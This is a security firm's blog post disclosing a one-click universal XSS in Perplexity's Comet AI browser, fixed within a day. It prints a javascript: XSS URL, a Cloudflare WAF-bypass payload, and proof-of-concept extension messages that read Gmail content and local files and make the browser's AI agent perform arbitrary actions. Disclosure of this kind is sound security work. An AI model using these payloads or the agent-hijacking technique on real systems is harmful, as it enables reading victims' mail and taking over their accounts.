---
date: '2025-11-24'
description: Hacktron CLI has entered private beta, offering tools for identifying
  and mitigating vulnerabilities in web applications, particularly against cross-site
  scripting (XSS). Its recent research highlighted a UXSS vulnerability in Perplexity
  Comet, a browser tightly integrated with AI functionalities. The vulnerability exploited
  loose permissions in Chrome's extension model, allowing attackers to run unauthorized
  commands and access sensitive information. The rapid response led to a fix within
  24 hours and a $6,000 bounty for responsible disclosure. Hacktron CLI agents are
  now available for scanning code, enhancing security workflows against common web
  and extension vulnerabilities.
link: https://www.hacktron.ai/blog/perplexity-comet-uxss
tags:
- hacktron-cli
- security-research
- cross-site-scripting
- browser-security
- vulnerability-disclosure
title: Securing Perplexity’s AI Browser from a One-Click UXSS ◆ Hacktron AI
---

The Hacktron CLI is now in private beta! [Start for free](https://app.hacktron.ai/signup)

The Hacktron CLI is now in private beta! [Start for free](https://app.hacktron.ai/signup)

The Hacktron CLI is now in private beta! [Start for free](https://app.hacktron.ai/signup)

The Hacktron CLI is now in private beta! [Start for free](https://app.hacktron.ai/signup)

The Hacktron CLI is now in private beta! [Start for free](https://app.hacktron.ai/signup)

The Hacktron CLI is now in private beta! [Start for free](https://app.hacktron.ai/signup)

The Hacktron CLI is now in private beta! [Start for free](https://app.hacktron.ai/signup)

The Hacktron CLI is now in private beta! [Start for free](https://app.hacktron.ai/signup)

The Hacktron CLI is now in private beta! [Start for free](https://app.hacktron.ai/signup)

The Hacktron CLI is now in private beta! [Start for free](https://app.hacktron.ai/signup)

The Hacktron CLI is now in private beta! [Start for free](https://app.hacktron.ai/signup)

The Hacktron CLI is now in private beta! [Start for free](https://app.hacktron.ai/signup)

The Hacktron CLI is now in private beta! [Start for free](https://app.hacktron.ai/signup)

The Hacktron CLI is now in private beta! [Start for free](https://app.hacktron.ai/signup)

The Hacktron CLI is now in private beta! [Start for free](https://app.hacktron.ai/signup)

◇⧫⬢⬨⬡◇◇⬨▲

⣀⣀⣤⣷⣷⣷⣤⣀⣀

▁▁▂▄▆█▆▄▂

◎◉◉◉◐◉◦◯○

Overview

- [Intro](https://www.hacktron.ai/blog/perplexity-comet-uxss#intro)
- [Perplexity Comet](https://www.hacktron.ai/blog/perplexity-comet-uxss#perplexity-comet)
- [How does Comet work?](https://www.hacktron.ai/blog/perplexity-comet-uxss#how-does-comet-work)
- [The hunt for XSS](https://www.hacktron.ai/blog/perplexity-comet-uxss#the-hunt-for-xss)
- [Escalating to UXSS](https://www.hacktron.ai/blog/perplexity-comet-uxss#escalating-to-uxss)
- [SOP Bypass](https://www.hacktron.ai/blog/perplexity-comet-uxss#sop-bypass)
- [Failed attempt to escalate to RCE](https://www.hacktron.ai/blog/perplexity-comet-uxss#failed-attempt-to-escalate-to-rce)
- [Assistant UXSS](https://www.hacktron.ai/blog/perplexity-comet-uxss#assistant-uxss)
- [Disclosure Timeline](https://www.hacktron.ai/blog/perplexity-comet-uxss#disclosure-timeline)
- [Hacktron CLI Release](https://www.hacktron.ai/blog/perplexity-comet-uxss#hacktron-cli-release)
- [About Us](https://www.hacktron.ai/blog/perplexity-comet-uxss#about-us)

![Securing Perplexity’s AI Browser from a One-Click UXSS](https://www.hacktron.ai/_astro/thumbnail.CDSLzFS1_1bg0aM.webp)

# Securing Perplexity’s AI Browser from a One-Click UXSS

![s1r1us](https://avatars.githubusercontent.com/u/22428507)[s1r1us](https://www.hacktron.ai/authors/s1r1us)

![sudi](https://avatars.githubusercontent.com/u/31372554?v=4)[sudi](https://www.hacktron.ai/authors/sudi)

November 24, 2025

8 min read

[research](https://www.hacktron.ai/tags/research) [browser-security](https://www.hacktron.ai/tags/browser-security)

- [Intro](https://www.hacktron.ai/blog/perplexity-comet-uxss#intro)
- [Perplexity Comet](https://www.hacktron.ai/blog/perplexity-comet-uxss#perplexity-comet)
- [How does Comet work?](https://www.hacktron.ai/blog/perplexity-comet-uxss#how-does-comet-work)
- [The hunt for XSS](https://www.hacktron.ai/blog/perplexity-comet-uxss#the-hunt-for-xss)
- [Escalating to UXSS](https://www.hacktron.ai/blog/perplexity-comet-uxss#escalating-to-uxss)
- [SOP Bypass](https://www.hacktron.ai/blog/perplexity-comet-uxss#sop-bypass)
- [Failed attempt to escalate to RCE](https://www.hacktron.ai/blog/perplexity-comet-uxss#failed-attempt-to-escalate-to-rce)
- [Assistant UXSS](https://www.hacktron.ai/blog/perplexity-comet-uxss#assistant-uxss)
- [Disclosure Timeline](https://www.hacktron.ai/blog/perplexity-comet-uxss#disclosure-timeline)
- [Hacktron CLI Release](https://www.hacktron.ai/blog/perplexity-comet-uxss#hacktron-cli-release)
- [About Us](https://www.hacktron.ai/blog/perplexity-comet-uxss#about-us)

index

## Intro

The beauty of composability is that it lets you build complex systems with speed and agility, but that same composability spawns weird state machines, aka “vulnerabilities”, that slip past developers’ cognitive load and only show up when an attacker deliberately assembles them.

Top hackers are pretty great at finding bugs that emerge from layers of abstraction in highly composable stacks. My favorite example is Google Project Zero’s Pegasus/ForcedEntry [case study](https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-into-nso-zero-click.html).

What’s beautiful is that every link in the chain, from a crafted iMessage to full device compromise, is individually simple and, in many cases, easy for AI agents to find. Hacktron AI will happily locate an integer overflow in xpdf or even generate a Turing-complete JBIG2 payload when you scaffold the prompt carefully. But hand an agent iMessage and say “hack this” and it’ll be clueless about where to start. A complex chain like ForcedEntry takes months of human effort to discover and weaponize; current models hardly run for hours, GPT-5 runs for 2 hours to exploit a buffer overflow in [libiec61850](https://metr.org/blog/2025-03-19-measuring-ai-ability-to-complete-long-tasks/)

All of this shows that the “drop-in AI hacker” that secures your infra and code is a marketing lie. These systems are great at many things, but they’re not a replacement for the best humans, at least for now. Pairing AI agents with top researchers accelerates identification and mitigation.

In that spirit, I want to share a case study: how Hacktron researchers found a UXSS in Perplexity Comet and then taught Hacktron to catch it.

## Perplexity Comet

Here is the PoC before we dive in!

Securing Perplexity’s AI Browser from a One-Click UXSS - YouTube

[Photo image of Mrgavyadha](https://www.youtube.com/channel/UCowWii3uEHfAc1qeOjOudIg?embeds_referring_euri=https%3A%2F%2Fwww.hacktron.ai%2F)

Mrgavyadha

3.72K subscribers

[Securing Perplexity’s AI Browser from a One-Click UXSS](https://www.youtube.com/watch?v=nyavp_5ijR0)

Mrgavyadha

Search

Watch later

Share

Copy link

Info

Shopping

Tap to unmute

If playback doesn't begin shortly, try restarting your device.

You're signed out

Videos you watch may be added to the TV's watch history and influence TV recommendations. To avoid this, cancel and sign in to YouTube on your computer.

CancelConfirm

More videos

## More videos

Share

Include playlist

An error occurred while retrieving sharing information. Please try again later.

[Watch on](https://www.youtube.com/watch?v=nyavp_5ijR0&embeds_referring_euri=https%3A%2F%2Fwww.hacktron.ai%2F)

0:00

0:00 / 0:57

•Live

•

I have been using Perplexity Comet, it’s a great product, nicely integrated with Chromium for real computer-use workflows.

From their site:

> “Comet is an AI-powered browser that acts as a personal assistant and thinking partner.
>
> Boost your focus, streamline your workflow, and turn curiosity into momentum.”

Comet is built on Chromium and ships with **Comet Assistant**, an AI agent that can perform almost any in-browser task a normal user could, driven by prompts.

As security researchers, we care that the tools we rely on daily are secure and we typically understand their internals well enough to poke.

## How does Comet work?

Most of Comet Assistant’s inner workings live inside the extension. The diagram shows a high-level view of how it all fits together.

![image.png](https://www.hacktron.ai/_astro/image.CcWjBPf0_F0Aeb.webp)

Looking at the extension source, the manifest has this bit:

```
"externally_connectable": {

  "matches": ["https://*.perplexity.ai/*"]

}
```

This caught my eye. `externally_connectable` lets whitelisted origins talk to the extension via `chrome.runtime.connect()` / `chrome.runtime.sendMessage()`.

A wildcard like `https://*.perplexity.ai/*` means **any** subdomain under `perplexity.ai` can reach the extension. From an attacker’s perspective, a single XSS on _any_ subdomain is an initial foothold to poke extension surfaces.

![](https://www.hacktron.ai/_astro/aa7dfc6f-8866-478a-b29a-3a267da9540e.BC3xlP9M_Z2d1TIm.webp)

I guessed that it would lead to UXSS, and shared with my team to initiate long running task of looking over all the perplexity ai subdomains for an XSS.

Note

All the classic extension footguns: loose external message listeners, over-permissive content scripts, risky DOM sinks (`scripting.executeScript`, `document.write`, `innerHTML`), and overly broad `web_accessible_resources`are already encoded into our carefully crafted Hacktron agents to spot with precision during reviews.

```
hacktron --agent chrome_extension
```

## The hunt for XSS

And the hunt begins. We enumerated subdomains and started poking around for anything interesting. One of them was running Discourse, so we kicked off Hacktron to hunt for a Discourse 0-day XSS and save some time. In parallel, we pulled down JavaScript from several other subdomains and ran our CLI to scan them for DOM XSS as well.

I was 100% sure we will find a DOM XSS. DOM XSS remains one of the most prevalent vulnerabilities across modern web applications, whether you’re using React, another framework, or vanilla JavaScript. In both our recent OpenAI Atlas vulnerability disclosure and other real-world cases, the main entry point for exploitation has been DOM-based XSS on a subdomain, where untrusted data flows into dangerous browser sinks.

To help teams catch these issues early, we use our **DOM XSS pack** to quickly surface risky sinks and potential vulnerabilities across the codebase. On top of that, we provide a **React security agent** that focuses on common framework-specific patterns.

Download the CLI and scan your code with:

```
hacktron --agent domxss
```

Note

Note: this CLI pack is not exhaustive. For a demo of our continuous CI/CD and auditing workflows with more extensive rules that pinpoint insecure usages, reach out to [hello@hacktron.ai](mailto:hello@hacktron.ai).

Before Hacktron finished, sudi stumbled on an easy win instead:

[https://fellowship.perplexity.ai/logout?returnTo=javascript:x](https://fellowship.perplexity.ai/logout?returnTo=javascript:x)

![image.png](https://www.hacktron.ai/_astro/image%201.Bdi5baZ4_1K5zsa.webp)

However, Cloudflare WAF blocks any XSS payload, so we needed a bypass. Another researcher of ours came out of nowhere and dropped the bypass for the WAF.

![](https://www.hacktron.ai/_astro/49c6e323-7fea-4737-b0a8-b6f13c779301.CrqJWZv6_23OYR1.webp)

This actually turned out to be such an elegant bypass. I leave it to reader to understand it.

```
java\nscript:\na\n=\n'r")';甲="javascript"+":<img"+" src=x"+" onerror"+"=aler"+"t(documen"+"t.domain"+a[2]+">";\ntop["locat"+"ion"]=甲;
```

## Escalating to UXSS

Any origin matching `externally_connectable` can hit listeners via `chrome.runtime.sendMessage`.

A quick search for `chrome.runtime.onMessageExternal.addListener`/`onConnectExternal` showed action handlers like:

- `COMET_CLOSE_SIDECAR`, `DEACTIVATE_SCREENSHOT_TOOL`, `MAKE_TASK_VISIBLE`, `MOVE_THREAD_TO_SIDECAR`
- `TEST_RUN_ACTION`, `RUN_IDLE_TEST`, `CALL_TOOL` (this one is juicy)

A typical call:

```
chrome.runtime.sendMessage("npclhjbddhklpbnacpjloidibaggcgon", {

  type: "TYPE",

  requestId: 1,

  method: "methodName",

  args: [""]

});
```

For instance, sudi noticed that `RUN_IDLE_TEST` uses the `chrome.debugger.sendCommand` API with the command [DOMSnapshot.captureSnapshot](https://www.hacktron.ai/blog/%5Bhttps://chromedevtools.github.io/devtools-protocol/tot/DOMSnapshot/#method-captureSnapshot%5D(https://chromedevtools.github.io/devtools-protocol/tot/DOMSnapshot/#method-captureSnapshot)) which basically allows us to have access to the full DOM tree

```
chrome.runtime.sendMessage("npclhjbddhklpbnacpjloidibaggcgon", {

  type: "RUN_IDLE_TEST",

  message: { url: "https://google.com" }

}, res => {

  console.log("Extension replied:", res);

});
```

![](https://www.hacktron.ai/_astro/c465773a-51dd-418c-9ece-500f047bb237.BA9OHG7l_Z1bljf6.webp)

As shown in the screenshot, both `snapshotHtml` and `snapshotAxTree` include the serialized DOM. Because the handler accepts `file://` URIs, the `RUN_IDLE_TEST` action lets an attacker fetch and read responses from arbitrary origins, including local files, effectively exposing cross-origin and local data.

## SOP Bypass

Meanwhile, I started Hacktron which found one interesting API: the `CALL_TOOL` and `startAgentFromPerplexity`.

![](https://www.hacktron.ai/_astro/d1049ecd-ce3a-48e5-9bea-f41118522b14.DwDwEzsu_1qLeK5.webp)

The code for those calls is as below:

```
const Uo = "CALL_TOOL",

if (e.type === Uo) return n(await EI(e, t));

[...]

class yI {

    constructor(t, n) {

        this.scopedLogger = t, this.sender = n, this.GetContent = n0(ap)(this.GetContent)

    }

    async GetContent(t, n = !1) { [...] }

    async GetSidecarContext(t) { [...] }

    async SearchBrowser(t) { [...] }

    async GetVisibleTabScreenshot(t) { [...] }

    async OpenTab(t) { [...] }

    async CloseTabs(t) { [...] }

    async GroupTabs(t){ [...] }

    async UngroupTabs(t) { [...] }

    async SearchTabGroups(t) { [...] }

}
```

We can use that to open any page and read that content. The following is the PoC for reading mail.gmail.com web page data.

```
await chrome.runtime.sendMessage('npclhjbddhklpbnacpjloidibaggcgon',{

    "type": "CALL_TOOL",

    "method": "OpenTab",

    "request": {

        "key": "unknown",

        "request_id": "unknown",

        "url": "https://mail.gmail.com/"

    }

})

await chrome.runtime.sendMessage('npclhjbddhklpbnacpjloidibaggcgon',{

    "type": "CALL_TOOL",

    "method": "GetContent",

    "request": {

        "goal_id": "0",

        "pages": [\
\
            {\
\
                "url": "https://mail.gmail.com/",\
\
                "id": 903156428\
\
            }\
\
        ],[...]

})
```

## Failed attempt to escalate to RCE

Initially, the team tried to escalate to RCE by using chrome privileged pages which didn’t yield any result. Essentially, the idea is to do something like this [report](https://issues.chromium.org/issues/370856871).

![](https://www.hacktron.ai/_astro/bbff8291-0144-4312-8a1b-8ed3d689788d.BoLGt87y_Z1jFHP0.webp)

We tried to install a malicious extension with high privilege, which didn’t yield any result.

![](https://www.hacktron.ai/_astro/02ceb757-f7fa-4c72-b761-ae8a8743679b.ClopS2F6_Z2fKA9X.webp)

## Assistant UXSS

But as Hacktron pointed out earlier, there was a `control_browser` message listener which was interesting to escalate to UXSS.

```
chrome.runtime.onConnectExternal.addListener(port => {

  // ...

  port.onMessage.addListener(async t => {

    if (t.action === "startAgentFromPerplexity") {

      // connects to wss://www.perplexity.ai, creates a task runner

      await a.startTask();

    }

  });

});
```

![](https://www.hacktron.ai/_astro/9bc1358c-fe7d-4b26-b469-426e468de7b0.DmdP6MUv_7aI59.webp)

The `startAgentFromPerplexity` opens a websocket to Perplexity’s backend and forwards the task. The backend returns selectors based on page responses, and the extension executes the resulting actions (clicks, etc.) in the page.

With this, we can open any URL and make the agent perform arbitrary actions.

Watch the full PoC where we are using the XSS to read gmail contents and change the perplexity username.

Securing Perplexity’s AI Browser from a One-Click UXSS - YouTube

[Photo image of Mrgavyadha](https://www.youtube.com/channel/UCowWii3uEHfAc1qeOjOudIg?embeds_referring_euri=https%3A%2F%2Fwww.hacktron.ai%2F)

Mrgavyadha

3.72K subscribers

[Securing Perplexity’s AI Browser from a One-Click UXSS](https://www.youtube.com/watch?v=7D6opP1eEs0)

Mrgavyadha

Search

Watch later

Share

Copy link

Info

Shopping

Tap to unmute

If playback doesn't begin shortly, try restarting your device.

More videos

## More videos

You're signed out

Videos you watch may be added to the TV's watch history and influence TV recommendations. To avoid this, cancel and sign in to YouTube on your computer.

CancelConfirm

Share

Include playlist

An error occurred while retrieving sharing information. Please try again later.

[Watch on](https://www.youtube.com/watch?v=7D6opP1eEs0&embeds_referring_euri=https%3A%2F%2Fwww.hacktron.ai%2F)

0:00

0:00 / 1:57

•Live

•

We immediately reached out to Perplexity through [security@perplexity.ai](mailto:security@perplexity.ai) and their security lead [Kyle](https://x.com/kplley) on Twitter, who was very helpful and got it fixed in a few days.

## **Disclosure Timeline**

The Perplexity team was quick to respond and patched the vulnerability within a day.

| Date | Event |
| --- | --- |
| Aug 19, 2025 | Hacktron reported via [security@perplexity.ai](mailto:security@perplexity.ai) |
| Aug 20, 2025 | Hot patch released in 24 hours |
| Aug 21, 2025 | Hacktron team validated the fix |
| - | Perplexity awarded us with **$6,000** bounty for responsible disclosure. |

## Hacktron CLI Release

We are releasing the agents that we created out of this research for free to run. It includes React common footguns and chrome extension vulnerabilities.

Download the CLI and review your code:

```
hacktron --agent chrome_extension

hacktron --agent domxss
```

## About Us

Our security research team is world-class: top-ranked CTF competitors, DEF CON-published researchers, acclaimed creators, and leading bug bounty hunters. We’ve hacked everything from browsers and operating systems to mobile apps, desktop software, and massive web platforms. Hacking stuff is our bread and butter.

Chances are, you’ve used something we’ve helped make more secure.

We’re now channeling that expertise into Hacktron: AI agents that bring real offensive capability into every stage of the software lifecycle.

Meet our team at [https://www.hacktron.ai/#team](https://www.hacktron.ai/#team).

Please contact us at [app.hacktron.ai/contact](https://app.hacktron.ai/contact) or [hello@hacktron.ai](mailto:hello@hacktron.ai) to discuss how we can help secure your product. You can also join our waitlist to be notified when we open up access more broadly. If you are building AI agents, send us an email. We hacked Cluely, Windsurf, now Perplexity, and work with teams closely to secure agentic systems.
